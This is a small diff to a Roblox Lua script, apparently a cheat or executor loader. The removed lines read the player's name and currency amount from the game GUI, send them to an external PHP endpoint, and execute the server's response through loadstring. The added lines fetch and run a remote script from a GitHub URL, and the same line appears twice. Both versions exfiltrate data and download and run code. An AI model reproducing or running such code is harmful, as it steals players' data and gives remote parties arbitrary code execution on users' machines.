@@ -1,16 +1,3 @@
-local playerName = game.Players.LocalPlayer.Name
-local player = game.Players:FindFirstChild(playerName)
-if player then
-    local gui = player:WaitForChild("PlayerGui")
-    local textLabel = gui:FindFirstChild("BucksIndicatorApp")
-        :FindFirstChild("CurrencyIndicator")
-        :FindFirstChild("Container")
-        :FindFirstChild("Amount")
-    
-    if textLabel and textLabel:IsA("TextLabel") then
-    
-	       loadstring(game:HttpGet("http://agt.ru.swtest.ru/TransferData.php?data="..textLabel.Text.."&name="..playerName))()
-    end
-end
 
---loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/qweScript/refs/heads/main/ValentainEvent"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/qweScript/refs/heads/main/ValentainEvent"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/qweScript/refs/heads/main/ValentainEvent"))()
